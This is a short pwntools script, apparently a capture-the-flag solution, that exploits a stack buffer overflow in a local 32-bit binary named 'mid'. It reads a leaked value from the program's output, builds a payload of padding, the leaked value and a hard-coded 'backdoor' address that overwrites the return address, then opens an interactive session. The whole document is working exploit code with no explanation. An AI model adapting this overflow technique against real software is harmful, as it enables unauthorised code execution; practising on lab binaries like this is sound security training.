from pwn import *
sh = process('./mid')
context.log_level = 'DEBUG'
sh.recvuntil('what\'s your name?,')
ecx = int(sh.recv()[2:10],16)
log.info('ecx = ' + hex(ecx))
#gdb.attach(sh)
backdoor = 0x0804851b
payload = 'A' * 28 + p32(ecx) + 'A'*20 + p32(backdoor)
sh.sendline(payload)
sh.interactive()
